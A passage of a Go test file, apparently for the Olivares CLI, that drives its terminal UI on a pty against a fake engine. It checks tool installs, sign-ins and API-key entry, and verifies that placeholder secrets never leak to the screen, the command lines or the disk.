// SPDX-FileCopyrightText: 2026 Olivares.AI
// SPDX-License-Identifier: AGPL-3.0-only
// Additional terms under AGPL-3.0-only section 7(a) disclaim warranty and limit liability: see DISCLAIMER.md at the repository root.

//go:build linux

package main

import (
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/olivaresai/olivares/cmd/olivares/internal/termrender"
	"github.com/olivaresai/olivares/cmd/olivares/internal/tui"
)

// The journeys drive the real `olivares ui` process on a pty against a fake engine
// that keeps state, the way a person would: keys in, screens out.

const (
	// uiTestTenant is the tenant sessionCreds names.
	uiTestTenant = "tenant-a"
	// uiTestKey looks like a real key so a leak of any part of it would be seen.
	uiTestKey  = "sk-ant-api03-PRIVATEKEYMATERIAL7q9zXw3Lm2"
	uiTestCode = "good-code"
	// uiOpenAIKey is a key of another provider, for the journeys that choose one.
	uiOpenAIKey = "sk-proj-OTHER-PROVIDER-KEY-0002"
	// uiLoginKey is the key a tool's own login waits for.
	uiLoginKey = "oc-LOGINKEYMATERIAL5r2tNq8Vw"
)

const (
	keyEnterBytes = "\r"
	keyEscBytes   = "\x1b"
	keyCtrlDBytes = "\x04"
)

// uiJourney is one `olivares ui` process and everything it drew.
type uiJourney struct {
	t      *testing.T
	master *os.File
	pid    int
	// home is the home directory the process ran in: anything it wrote to disk is
	// under it.
	home string
	// transcript is every byte the process wrote to the terminal.
	transcript strings.Builder
	// argv is the command line the process had while text was typed into it, read
	// from the system as `ps` would show it.
	argv []string
}

// startUIJourney starts `olivares ui` on a pty against e, with color off. It
// returns the journey and a function that waits for the exit code.
func startUIJourney(t *testing.T, e *uiEngine) (*uiJourney, func() int) {
	t.Helper()
	return startUIJourneyAt(t, e.URL, uiTestToken, uiTestTenant)
}

// startUIJourneyAt is startUIJourney against any engine: the fake one, or a real
// one the test booted.
func startUIJourneyAt(t *testing.T, serverURL, token, tenant string) (*uiJourney, func() int) {
	t.Helper()
	master, slave := openPTY(t, tui.MinWidth, tui.MinHeight)
	env := cliProcessEnv(t, "OLIVARES_SERVER_URL="+serverURL, "OLIVARES_TOKEN="+token, "OLIVARES_TENANT="+tenant, "NO_COLOR=1")
	home := ""
	for _, kv := range env {
		if v, ok := strings.CutPrefix(kv, "HOME="); ok {
			home = v
		}
	}
	// State, cache and temp files go under home too, so the scan for a key on disk
	// covers every place the process could write one.
	for name, dir := range map[string]string{"XDG_STATE_HOME": ".local/state", "XDG_CACHE_HOME": ".cache", "TMPDIR": "tmp"} {
		path := filepath.Join(home, dir)
		if err := os.MkdirAll(path, 0o700); err != nil {
			t.Fatalf("create %s: %v", path, err)
		}
		env = append(env, name+"="+path)
	}
	cmd := startCLI(t, env, slave, slave, slave, "ui")
	return &uiJourney{t: t, master: master, pid: cmd.Process.Pid, home: home}, func() int { return waitCLI(t, cmd) }
}

// installWait is the budget for the screen an install reaches once the engine has written the
// tool. The install verifies a signed release with gpg; on a loaded CI runner it outlasted
// ptyWait (red main 5294e548: the screen still read Installing… after 10 s).
const installWait = 60 * time.Second

// see waits for the screen to show want.
func (j *uiJourney) see(want string) {
	j.t.Helper()
	j.transcript.WriteString(readScreen(j.t, j.master, want))
}

// seeWithin is see with its own budget, for a step that waits on the engine's work.
func (j *uiJourney) seeWithin(want string, wait time.Duration) {
	j.t.Helper()
	j.transcript.WriteString(readScreenWithin(j.t, j.master, want, wait))
}

func (j *uiJourney) press(keys string) {
	j.t.Helper()
	if _, err := j.master.Write([]byte(keys)); err != nil {
		j.t.Fatalf("send %q: %v", keys, err)
	}
}

// typeText sends text one key at a time, as a person types it, then records the
// process's command line.
func (j *uiJourney) typeText(text string) {
	j.t.Helper()
	for _, r := range text {
		j.press(string(r))
	}
	j.sampleArgv()
}

// sampleArgv records the command line of the process and of everything below it,
// as the system shows it now. A journey samples it again while a request that
// carries a secret is on its way, which is when a child could be given one.
func (j *uiJourney) sampleArgv() {
	j.t.Helper()
	raw, err := os.ReadFile("/proc/" + strconv.Itoa(j.pid) + "/cmdline")
	if err != nil {
		j.t.Fatalf("read the command line of the process: %v", err)
	}
	j.argv = append(j.argv, strings.Split(string(raw), "\x00")...)
	j.argv = append(j.argv, descendantArgv(j.t, j.pid)...)
}

// sampleEngineArgv records the command line of every process below the test
// process, where a test that composes the engine in-process runs it: the tools
// the engine starts are its children.
func (j *uiJourney) sampleEngineArgv() {
	j.t.Helper()
	j.argv = append(j.argv, descendantArgv(j.t, os.Getpid())...)
}

// descendantArgv is the command line of every process below pid, as the system
// shows it while they run. The screens start none, so a key typed into them has
// no command line to appear in; this is what would show it if they did.
func descendantArgv(t *testing.T, pid int) []string {
	t.Helper()
	// Probe the live test process, not a child that may already have exited.
	// Kernels without CONFIG_PROC_CHILDREN cannot support this leak check.
	self := strconv.Itoa(os.Getpid())
	root := "/proc/" + self + "/task/" + self + "/children"
	if _, err := os.ReadFile(root); os.IsNotExist(err) {
		t.Skipf("argv leak check needs proc task children on this kernel: %v", err)
	} else if err != nil {
		t.Fatalf("probe proc task children: %v", err)
	}
	var argv []string
	files, _ := filepath.Glob("/proc/" + strconv.Itoa(pid) + "/task/*/children")
	for _, f := range files {
		raw, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		for _, child := range strings.Fields(string(raw)) {
			if cmdline, err := os.ReadFile("/proc/" + child + "/cmdline"); err == nil {
				argv = append(argv, strings.Split(string(cmdline), "\x00")...)
			}
			if n, err := strconv.Atoi(child); err == nil {
				argv = append(argv, descendantArgv(t, n)...)
			}
		}
	}
	return argv
}

// A tool can exit between being listed as a child and having its children read.
func TestDescendantArgvIgnoresAnExitedChild(t *testing.T) {
	child := exec.Command("sh", "-c", "exit 0")
	if err := child.Run(); err != nil {
		t.Fatalf("run a child: %v", err)
	}
	if got := descendantArgv(t, child.Process.Pid); len(got) != 0 {
		t.Errorf("an exited child has arguments: %q", got)
	}
}

// The check above can fail: a process that carries the key in its arguments is seen.
func TestDescendantArgvSeesAKeyInAChildsArguments(t *testing.T) {
	// The shell stays alive after sleep, so its arguments (the key is $0) remain readable.
	child := exec.Command("sh", "-c", "sleep 30; :", uiTestKey)
	if err := child.Start(); err != nil {
		t.Fatalf("start a child: %v", err)
	}
	t.Cleanup(func() { _ = child.Process.Kill(); _ = child.Wait() })
	// A process shows its arguments only once its exec is done.
	for end := time.Now().Add(5 * time.Second); time.Now().Before(end); time.Sleep(10 * time.Millisecond) {
		if raw, _ := os.ReadFile("/proc/" + strconv.Itoa(child.Process.Pid) + "/cmdline"); len(raw) > 0 {
			break
		}
	}
	if got := strings.Join(descendantArgv(t, os.Getpid()), " "); !strings.Contains(got, uiTestKey) {
		t.Errorf("a child with the key in argv was not seen: %q", got)
	}
}

// The check below can fail: a key written under the home directory is found, and
// a file that holds none is not.
func TestFileHoldingSecretFindsAKeyUnderHome(t *testing.T) {
	home := t.TempDir()
	if err := os.WriteFile(filepath.Join(home, "config.yaml"), []byte("server: http://x\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := fileHoldingSecret(t, home, uiTestKey); got != "" {
		t.Errorf("found the key in %s, which holds none", got)
	}
	if err := os.WriteFile(filepath.Join(home, "debug.log"), []byte("key="+uiTestKey), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := fileHoldingSecret(t, home, uiTestKey); filepath.Base(got) != "debug.log" {
		t.Errorf("the file holding the key is %q, want debug.log", got)
	}
}

// assertNeverShown fails when any run of secretWindow characters of secret reached
// the terminal or the process's command line.
func (j *uiJourney) assertNeverShown(secret string) {
	j.t.Helper()
	screen, argv := termrender.StripANSI(j.transcript.String()), strings.Join(j.argv, " ")
	for i := 0; i+secretWindow <= len(secret); i++ {
		part := secret[i : i+secretWindow]
		if strings.Contains(screen, part) || strings.Contains(argv, part) {
			j.t.Errorf("part of the secret %q reached the screen or the command line", part)
			return
		}
	}
}

// assertNotOnDisk fails when any run of secretWindow characters of secret was
// written to a file under the process's home: its config, data and any log.
func (j *uiJourney) assertNotOnDisk(secret string) {
	j.t.Helper()
	if j.home == "" {
		j.t.Fatal("the journey does not know the process's home directory")
	}
	if path := fileHoldingSecret(j.t, j.home, secret); path != "" {
		j.t.Errorf("part of the secret was written to %s", path)
	}
}

// fileHoldingSecret is the first regular file under dir that holds any run of
// secretWindow characters of secret, or "" when none does.
func fileHoldingSecret(t *testing.T, dir, secret string) string {
	t.Helper()
	found := ""
	err := filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || found != "" || d.IsDir() || !d.Type().IsRegular() {
			return err
		}
		raw, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		for i := 0; i+secretWindow <= len(secret); i++ {
			if strings.Contains(string(raw), secret[i:i+secretWindow]) {
				found = path
				return nil
			}
		}
		return nil
	})
	if err != nil {
		t.Fatalf("read the files under %s: %v", dir, err)
	}
	return found
}

// secretWindow is the shortest run of a secret that counts as showing it.
const secretWindow = 8

// finish waits for the exit code and keeps whatever the process still wrote, so a
// check on the transcript covers the whole run and not only what was waited for.
func (j *uiJourney) finish(wait func() int) int {
	j.t.Helper()
	code := wait()
	j.transcript.WriteString(readAvailable(j.t, j.master))
	return code
}

// typeKey fills the Add an API key form from its first field, as a person does:
// the provider is kept, the key is typed (it is the first field that takes text,
// so a paste lands in a hidden field), the name is left empty and the last Enter
// sends it.
func (j *uiJourney) typeKey(key string) {
	j.t.Helper()
	j.press(keyEnterBytes) // provider, kept as Anthropic
	j.typeText(key)
	j.press(keyEnterBytes) // to the name, left empty
	j.press(keyEnterBytes) // send
}

// search opens the screen's search, types words and applies it.
func (j *uiJourney) search(words string) {
	j.t.Helper()
	j.press("/")
	j.typeText(words)
	j.press(keyEnterBytes)
}

func TestToolsScreensInstallSignInAndAddAKeyLikeTheCommands(t *testing.T) {
	e := newUIEngine(t)
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes) // Get started
	j.see("1 of 3 done. Next: olivares tool install claude")
	j.press(keyEnterBytes) // install it
	j.see("Installing Claude Code 2.1.286 (verified: signature)")
	j.see("2 of 3 done. Next: olivares tool login claude")
	j.press(keyEnterBytes) // sign it in
	j.see("Paste the code the page shows")
	j.typeText(uiTestCode)
	j.press(keyEnterBytes)
	j.see("3 of 3 done. Next: olivares session start <folder>")
	j.typeText("jjjjj") // past the five tools, to Add an API key
	j.press(keyEnterBytes)
	j.see("The key is never shown")
	j.press(keyEnterBytes) // provider, kept as Anthropic
	j.typeText(uiTestKey)
	j.see("hidden · 41 characters")
	j.press(keyEnterBytes) // to the name, left empty
	j.press(keyEnterBytes) // send
	j.sampleArgv()         // while the engine seals and tests it
	j.see("Connection test: works.")
	j.press(keyEnterBytes) // back to the list
	j.see("API key · Anthropic · …wxyz · works")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("Ctrl-D exited %d, want 0", code)
	}

	// The screens made exactly these writes, in this order: the key, the code and
	// the request id are redacted, as the ledger keeps them.
	wantLedger := []string{
		`POST /v1/m/agenttools/plans {"driver":"claude","version":"latest"}`,
		`POST /v1/m/agenttools/installs {"plan_digest":"d1","request_id":"<request_id>"}`,
		`POST /v1/m/agenttools/sign-in {"driver":"claude","tenant_id":"tenant-a"}`,
		`POST /v1/m/agenttools/sign-in/s1/code {"code":"<code>"}`,
		`POST /v1/m/sessions/providers {"api_key":"<api_key>","base_url":"","display_name":"Anthropic","kind":"anthropic"}`,
		`POST /v1/m/sessions/providers/prv_01/test {}`,
	}
	if got := e.ledger(); !reflect.DeepEqual(got, wantLedger) {
		t.Errorf("the screens' writes are\n%q\nwant\n%q", got, wantLedger)
	}

	// The same work from the commands, on a fresh engine, leaves the same events.
	c := newUIEngine(t)
	creds := sessionCreds(c.URL)
	for _, step := range []struct {
		stdin string
		args  []string
	}{
		{"", []string{"tool", "install", "claude"}},
		{uiTestCode + "\n", []string{"tool", "login", "claude"}},
		{uiTestKey + "\n", []string{"provider", "add", "--kind", "anthropic", "--name", "Anthropic"}},
	} {
		if _, errb, err := execSessionCLI(t, strings.NewReader(step.stdin), append(step.args, creds...)...); err != nil {
			t.Fatalf("olivares %s: %v\n%s", strings.Join(step.args, " "), err, errb)
		}
	}
	if got, want := e.ledger(), c.ledger(); !reflect.DeepEqual(got, want) {
		t.Errorf("the screens left a different ledger than the commands:\nscreens:  %q\ncommands: %q", got, want)
	}
	if got := e.receivedKeys(); !reflect.DeepEqual(got, []string{uiTestKey}) {
		t.Errorf("the engine received keys %q, want the one that was typed", got)
	}

	// The key was typed on a terminal and sent to the engine, and nowhere else.
	j.assertNeverShown(uiTestKey)
	j.assertNeverShown(uiTestCode)
	j.assertNotOnDisk(uiTestKey)
	j.assertNotOnDisk(uiTestCode)
	if sgr.MatchString(j.transcript.String()) {
		t.Error("NO_COLOR is set and the screens still drew color")
	}
}

// OpenCode's first login method is its own provider, which waits for a key. The
// Sign in row shows `olivares tool login opencode`, so the screen starts the
// method that command starts and takes the key the way it does.
func TestToolsScreensSignInWithAToolsOwnKeyLikeTheCommand(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["opencode"], e.keyLogin = true, true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Installed · not signed in  [ Sign in ]")
	j.search("OpenCode")
	j.press(keyEnterBytes)
	j.see("Paste the key, then press Enter.")
	if !strings.Contains(termrender.StripANSI(j.transcript.String()), "Create an API key here, then paste it below:") {
		t.Error("the page does not say where the key is made")
	}
	j.typeText(uiLoginKey)
	j.see(fmt.Sprintf("hidden · %d characters", len(uiLoginKey)))
	j.press(keyEnterBytes)
	j.sampleArgv() // while the engine hands the key to the tool
	j.see("OpenCode is signed in.")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("Ctrl-D exited %d, want 0", code)
	}
	wantLedger := []string{
		`POST /v1/m/agenttools/sign-in {"driver":"opencode","method":"opencode","tenant_id":"tenant-a"}`,
		`POST /v1/m/agenttools/sign-in/s3/code {"code":"<code>"}`,
	}
	if got := e.ledger(); !reflect.DeepEqual(got, wantLedger) {
		t.Errorf("the screen's writes are\n%q\nwant\n%q", got, wantLedger)
	}
	c := newUIEngine(t)
	c.set(func() { c.installed["opencode"], c.keyLogin = true, true })
	if _, errb, err := execSessionCLI(t, strings.NewReader(uiLoginKey+"\n"), append([]string{"tool", "login", "opencode"}, sessionCreds(c.URL)...)...); err != nil {
		t.Fatalf("olivares tool login opencode: %v\n%s", err, errb)
	}
	if got, want := e.ledger(), c.ledger(); !reflect.DeepEqual(got, want) {
		t.Errorf("the screen left a different ledger than the command:\nscreen:  %q\ncommand: %q", got, want)
	}
	if got := e.receivedLoginKeys(); !reflect.DeepEqual(got, []string{uiLoginKey}) {
		t.Errorf("the engine received keys %q, want the one that was typed", got)
	}
	j.assertNeverShown(uiLoginKey)
	j.assertNotOnDisk(uiLoginKey)
}

// A key login that names no page still takes the key, as the command does.
func TestToolsScreensTakeAKeyForALoginThatNamesNoPage(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["opencode"], e.keyLogin, e.keyLoginNoLink = true, true, true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Installed · not signed in  [ Sign in ]")
	j.search("OpenCode")
	j.press(keyEnterBytes)
	j.see("Paste the key, then press Enter.")
	j.typeText(uiLoginKey)
	j.press(keyEnterBytes)
	j.see("OpenCode is signed in.")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("Ctrl-D exited %d, want 0", code)
	}
	if got := e.receivedLoginKeys(); !reflect.DeepEqual(got, []string{uiLoginKey}) {
		t.Errorf("the engine received keys %q, want the one that was typed", got)
	}
}

// The command reads the sign-in status first and stops for a tool that is signed
// in. The screen does the same: a row that was stale when Enter was pressed
// starts no second login.
func TestToolsScreensStartNoLoginForAToolThatIsSignedInNow(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Installed · not signed in  [ Sign in ]")
	j.search("Codex")
	e.set(func() { e.signedIn["codex"] = true }) // signed in from another terminal
	j.press(keyEnterBytes)
	j.see("Codex is already signed in")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("Ctrl-D exited %d, want 0", code)
	}
	if got := e.ledger(); len(got) != 0 {
		t.Errorf("the screen wrote %q for a tool that is signed in", got)
	}
}

// When the status of the login methods cannot be read, the command says that its
// default login runs. The screen says it on the page.
func TestToolsScreensSayWhenTheLoginMethodsCouldNotBeRead(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["opencode"], e.signInStatusDown = true, true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("[ Sign in ]")
	j.search("OpenCode")
	j.press(keyEnterBytes)
	j.see("Could not read OpenCode's login methods, so its default login runs.")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("Ctrl-D exited %d, want 0", code)
	}
}

// Leaving a sign-in, or quitting while it waits, ends it on the engine: a login
// nobody ends keeps the tool's own login process open there for 15 minutes.
func TestToolsScreensEndAWaitingSignInOnTheEngine(t *testing.T) {
	for _, tc := range []struct {
		name string
		keys string
	}{
		{"Esc", keyEscBytes},
		{"Ctrl-D", keyCtrlDBytes},
	} {
		t.Run(tc.name, func(t *testing.T) {
			e := newUIEngine(t)
			e.set(func() { e.installed["codex"] = true })
			j, wait := startUIJourney(t, e)
			j.see("Get started")
			j.press("\x1b[B") // AI tools
			j.press(keyEnterBytes)
			j.see("Not installed  [ Install ]")
			j.search("Codex")
			j.press(keyEnterBytes)
			j.see("Waiting for you to finish on the sign-in page")
			j.press(tc.keys)
			select {
			case <-e.deleted:
			case <-time.After(ptyWait):
				t.Fatalf("%s left the sign-in open on the engine", tc.name)
			}
			if tc.keys == keyEscBytes {
				j.press(keyCtrlDBytes)
			}
			if code := j.finish(wait); code != 0 {
				t.Fatalf("exited %d, want 0", code)
			}
		})
	}
}

// A code the engine does not accept is said so and asked for again; the second
// code signs in. Each code is one write on the ledger.
func TestToolsScreensAskAgainAfterAWrongCode(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["claude"] = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes)
	j.see("2 of 3 done. Next: olivares tool login claude")
	j.press(keyEnterBytes)
	j.see("Paste the code the page shows")
	j.typeText("wrong-code")
	j.press(keyEnterBytes)
	j.see("That code was not accepted.")
	// The field took the next code from empty: nine characters, not nineteen, and
	// typing was not ignored. The code arrives in one write, as a paste does.
	j.press(uiTestCode)
	j.see("hidden · 9 characters")
	j.press(keyEnterBytes)
	j.see("3 of 3 done. Next: olivares session start <folder>")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	want := []string{
		`POST /v1/m/agenttools/sign-in {"driver":"claude","tenant_id":"tenant-a"}`,
		`POST /v1/m/agenttools/sign-in/s1/code {"code":"<code>"}`,
		`POST /v1/m/agenttools/sign-in/s1/code {"code":"<code>"}`,
	}
	if got := e.ledger(); !reflect.DeepEqual(got, want) {
		t.Errorf("ledger = %q, want %q", got, want)
	}
	if screen := termrender.StripANSI(j.transcript.String()); strings.Contains(screen, "wrong-code") || strings.Contains(screen, uiTestCode) {
		t.Error("a sign-in code reached the screen")
	}
}

// An install that fails says why in the engine's words and leaves the tool as
// it was: not installed, with the way to try again.
func TestToolsScreensSayWhyAnInstallFailed(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.jobFails = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes)
	j.see("1 of 3 done. Next: olivares tool install claude")
	j.press(keyEnterBytes)
	j.see("Claude Code was not installed: No space left on the device.")
	j.press(keyEnterBytes) // back to the list
	j.see("Not installed  [ Install ]")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if e.installed["claude"] {
		t.Error("the engine installed the tool although its job failed")
	}
}

// A key the engine refuses is said not added, and the key, which a careless
// engine echoes in its refusal, reaches neither the screen nor anything else.
func TestToolsScreensSayAKeyWasNotAddedAndNeverShowIt(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.rejectKey = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.typeText("jjjjj") // past the five tools, to Add an API key
	j.press(keyEnterBytes)
	j.see("The key is never shown")
	j.typeKey(uiTestKey)
	j.see("The key was not added")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	j.assertNeverShown(uiTestKey)
	j.assertNotOnDisk(uiTestKey)
	if got := e.receivedKeys(); len(got) != 1 {
		t.Errorf("the engine received %d keys, want the one typed", len(got))
	}
}

// With the engine's inventory down the screen says so in the engine's words and
// the person can still leave it.
func TestToolsScreensSayWhenTheEngineCannotBeRead(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.inventoryDown = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes)
	j.see("Could not read the engine")
	j.press(keyEscBytes)
	j.see("Security") // only the main menu has this row: Esc left the screen
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
}

// A key the engine may have sealed (the answer never came back as a success) is not
// said to be refused, and the list shows what the engine holds when the person
// goes back: adding it again would make a second one.
func TestToolsScreensAskTheEngineAgainWhenAKeyMayHaveBeenAdded(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.sealThenFail = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.typeText("jjjjj") // past the five tools, to Add an API key
	j.press(keyEnterBytes)
	j.see("The key is never shown")
	j.typeKey(uiTestKey)
	j.see("The key may not have been added")
	j.press(keyEnterBytes) // back to the list
	j.see("API key · Anthropic · …wxyz")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if screen := termrender.StripANSI(j.transcript.String()); strings.Contains(screen, "The key was not added") {
		t.Error("a key the engine may have sealed was said not to be added")
	}
}

// A sign-in the engine would not end is said so: the person leaves, and the login
// stays open there for up to 15 minutes.
func TestToolsScreensSayWhenALeftSignInCouldNotBeEnded(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true })
	e.set(func() { e.deleteFails = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	j.see("Waiting for you to finish on the sign-in page")
	j.press(keyEscBytes)
	j.see("Could not end the sign-in on the engine")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
}

// Esc on an install that is still running leaves it running on the engine, writes
// nothing more there and shows the tool as the engine reports it.
func TestToolsScreensLeaveARunningInstallToTheEngine(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.jobHangs = true })
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press(keyEnterBytes)
	j.see("1 of 3 done. Next: olivares tool install claude")
	j.press(keyEnterBytes)
	j.see("Installing Claude Code 2.1.286")
	// That line is drawn when the plan is known; leave only once the screen holds
	// the job's id, which is when it first asks for the job's status.
	select {
	case <-e.jobPolled:
	case <-time.After(ptyWait):
		t.Fatal("the engine never saw the install job asked for")
	}
	j.press(keyEscBytes)
	// The notice and the list's footer are one frame: read once, check both.
	mark := j.transcript.Len()
	j.see("Claude Code is still installing on the engine.")
	if !strings.Contains(termrender.StripANSI(j.transcript.String()[mark:]), "1 of 3 done. Next: olivares tool install claude") {
		t.Error("the list behind the notice does not show the tool as the engine reports it")
	}
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	want := []string{
		`POST /v1/m/agenttools/plans {"driver":"claude","version":"latest"}`,
		`POST /v1/m/agenttools/installs {"plan_digest":"d1","request_id":"<request_id>"}`,
	}
	if got := e.ledger(); !reflect.DeepEqual(got, want) {
		t.Errorf("ledger = %q, want %q", got, want)
	}
}

// Closing the terminal or a signal ends a waiting sign-in on the engine too.
func TestToolsScreensEndAWaitingSignInOnASignal(t *testing.T) {
	for _, sig := range []syscall.Signal{syscall.SIGTERM, syscall.SIGHUP} {
		t.Run(sig.String(), func(t *testing.T) {
			e := newUIEngine(t)
			e.set(func() { e.installed["codex"] = true })
			j, wait := startUIJourney(t, e)
			j.see("Get started")
			j.press("\x1b[B") // AI tools
			j.press(keyEnterBytes)
			j.see("Not installed  [ Install ]")
			j.search("Codex")
			j.press(keyEnterBytes)
			j.see("Waiting for you to finish on the sign-in page")
			if err := syscall.Kill(j.pid, sig); err != nil {
				t.Fatalf("send %v: %v", sig, err)
			}
			select {
			case <-e.deleted:
			case <-time.After(ptyWait):
				t.Fatalf("%v left the sign-in open on the engine", sig)
			}
			if code := j.finish(wait); code != 128+int(sig) {
				t.Fatalf("%v exited %d, want %d", sig, code, 128+int(sig))
			}
		})
	}
}

// Esc before the engine answered the start of a sign-in cannot end what the
// engine may have started; the list says so, as `olivares tool login` does.
func TestToolsScreensSayWhenASignInWasLeftBeforeTheEngineAnswered(t *testing.T) {
	e := newUIEngine(t)
	e.set(func() { e.installed["codex"] = true })
	gate := e.hold("POST", "/v1/m/agenttools/sign-in")
	t.Cleanup(gate.open)
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.search("Codex")
	j.press(keyEnterBytes)
	j.see("Starting the Codex sign-in")
	select {
	case <-gate.arrived:
	case <-time.After(ptyWait):
		t.Fatal("the engine never saw the sign-in request")
	}
	j.press(keyEscBytes)
	j.see("The sign-in may have started")
	gate.open()
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
}

// An answer that comes after the person left the panel is said on the list they
// are on; it does not close the list or open the panel again.
func TestToolsScreensSayAKeyWasAddedWhenTheAnswerComesAfterThePersonLeft(t *testing.T) {
	e := newUIEngine(t)
	gate := e.hold("POST", "/v1/m/sessions/providers")
	t.Cleanup(gate.open)
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.typeText("jjjjj") // past the five tools, to Add an API key
	j.press(keyEnterBytes)
	j.see("The key is never shown")
	j.typeKey(uiTestKey)
	j.see("Sealing the key and testing it") // reading the screen keeps the pty drained
	j.sampleArgv()                          // the request is held: no child may carry the key now either
	select {
	case <-gate.arrived:
	case <-time.After(ptyWait):
		t.Fatal("the engine never saw the key")
	}
	j.press(keyEscBytes)                            // leave while the engine has not answered
	j.see("Enter open  / search  ? help  Esc back") // the list is back: the Esc is taken before the engine answers
	gate.open()
	j.see("Added Anthropic.")
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	j.assertNeverShown(uiTestKey)
	j.assertNotOnDisk(uiTestKey)
}

// An answer that comes after the person left the list that opened the panel has no
// screen to be said on: the command says it when the screens close.
func TestToolsScreensSayAKeyWasAddedWhenTheListItCameFromIsGone(t *testing.T) {
	e := newUIEngine(t)
	gate := e.hold("POST", providersPath+"/prv_01/test")
	t.Cleanup(gate.open)
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.typeText("jjjjj") // past the five tools, to Add an API key
	j.press(keyEnterBytes)
	j.see("The key is never shown")
	j.typeKey(uiTestKey)
	j.see("Sealing the key and testing it") // reading the screen keeps the pty drained
	select {
	case <-gate.arrived: // the engine holds the key and has not finished testing it
	case <-time.After(ptyWait):
		t.Fatal("the engine never tested the key")
	}
	j.press(keyEscBytes) // the panel
	j.see("Enter open  / search  ? help  Esc back")
	j.press(keyEscBytes) // the list: back at the main menu
	j.see("· version")
	gate.open()
	deadline := time.Now().Add(ptyWait)
	for len(e.ledger()) < 2 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	j.press("\x1b[B") // a key after the answer: the loop has taken the answer before it
	j.press(keyCtrlDBytes)
	if code := j.finish(wait); code != 0 {
		t.Fatalf("exited %d, want 0", code)
	}
	if screen := termrender.StripANSI(j.transcript.String()); !strings.Contains(screen, "Added Anthropic.") {
		t.Errorf("the key was added after the person left both screens and nothing said so:\n%s", screen)
	}
	j.assertNeverShown(uiTestKey)
}

// The provider and the name the person chose are what the engine receives.
func TestToolsScreensAddAKeyForTheProviderAndNameThatWereChosen(t *testing.T) {
	e := newUIEngine(t)
	j, wait := startUIJourney(t, e)
	j.see("Get started")
	j.press("\x1b[B") // AI tools
	j.press(keyEnterBytes)
	j.see("Not installed  [ Install ]")
	j.typeText("jjjjj") // past the five tools, to Add an API key
	j.press(keyEnterBytes)
	j.see("The key is never shown")
